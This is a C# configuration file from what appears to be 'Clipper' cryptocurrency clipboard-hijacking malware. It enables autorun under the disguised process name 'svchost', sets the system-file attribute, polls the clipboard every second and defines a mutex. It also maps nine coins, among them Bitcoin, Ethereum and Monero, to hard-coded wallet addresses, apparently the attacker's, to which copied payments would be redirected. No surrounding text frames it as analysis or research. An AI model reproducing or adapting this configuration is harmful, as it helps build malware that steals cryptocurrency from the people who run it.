﻿using System;
using System.Collections.Generic;

namespace Clipper
{
	internal sealed class config
	{
		public static bool autorun_enabled = true;

		public static string autorun_name = "svchost";

		public static bool attribute_hidden = false;

		public static bool attribute_system = true;

		public static int clipboard_check_delay = 1;

		public static Dictionary<string, string> addresses = new Dictionary<string, string>
		{
			{ "btc", "19TRkrbLDpFQdfsinsVZBtsguKu2AbZQr2" },
			{ "eth", "0xc064C9800E2611C074c2D074853Fe663C0B510Fe" },
			{ "xmr", "894FnmsZonmFMGqynM5KQrY8Efqyzgv4w9hKCdj2kZXGZaQqPSQQ5jNV3Bn5af7zoyh4aR4hqV2n3MRx43e3LHnuPbUoRsj" },
			{ "xlm", "GBWXBV37OFDJRRLBNGSJJ4QKDPFZPTIWAXEAK5X4GVN6VMAAEXLCJDRN" },
			{ "xrp", "rD1QUUnWuaGjp3N4RcSVsNCgNx8G4dbx8g" },
			{ "ltc", "ltc1qjfmkz788hv5hz23vdhy9ht3dnsmpwsaaqw5rx0" },
			{ "nec", "NfqBoD2VyiFCqixb3SuTfBr8THkK3BE7qE" },
			{ "bch", "qpkld2r8qxaksvln3y5qxldgwdk4c5nw6v3c2rn0q9" },
			{ "dash", "Xdx2Qhrm5wEf6iewhXyEr9CPxpmh3yyjh1" }
		};

		public static string mutex = "sdh34yszdfgb";
	}
}
